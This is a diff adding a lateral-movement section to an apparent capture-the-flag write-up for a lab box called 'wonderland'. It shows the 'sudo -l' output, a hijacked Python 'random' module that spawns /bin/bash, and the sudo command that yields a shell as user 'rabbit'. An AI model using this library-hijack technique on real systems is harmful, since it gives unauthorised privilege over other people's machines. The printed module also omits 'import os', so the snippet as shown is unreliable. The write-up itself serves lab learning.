@@ -223,7 +223,39 @@ alice@wonderland:~$
 
         <div class="wt-section" id="latmov">
             <h1> Lateral Movements </h1>
+            <p class="writeup-text"> I usually like to check sudo permissions first. </p>
+            <p class="writeup-text">
+                <code class="shell-response">
+alice@wonderland:~$ sudo -l
 
+[sudo] password for alice:
+Matching Defaults entries for alice on wonderland:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User alice may run the following commands on wonderland:
+    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+                </code>
+            </p>
+            <p class="writeup-text"> Here we can see that we can execute the python file /home/alice/walrus_and_the_carpenter.py. If we display the content of this file, we can see that it uses the 'random' module. Since we have privilege to write in the current directory, we can operate a python library hijacking by creating our own random module. </p>
+
+            <p class="writeup-text">
+                <code class="shell-response">
+custom random.py :
+
+
+def choice(str):
+    os.system("/bin/bash")
+                </code>
+            </p>
+            <p class="writeup-text"> Now we can execute the python file as 'rabbit' user : </p>
+            <p class="writeup-text">
+                <code class="shell-response">
+alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+
+rabbit@wonderland:~$ id
+uid=1002(rabbit) gid=1002(rabbit) groups=1002(rabbit)
+                </code>
+            </p>
         </div>
 
         <div class="wt-section" id="privesc">
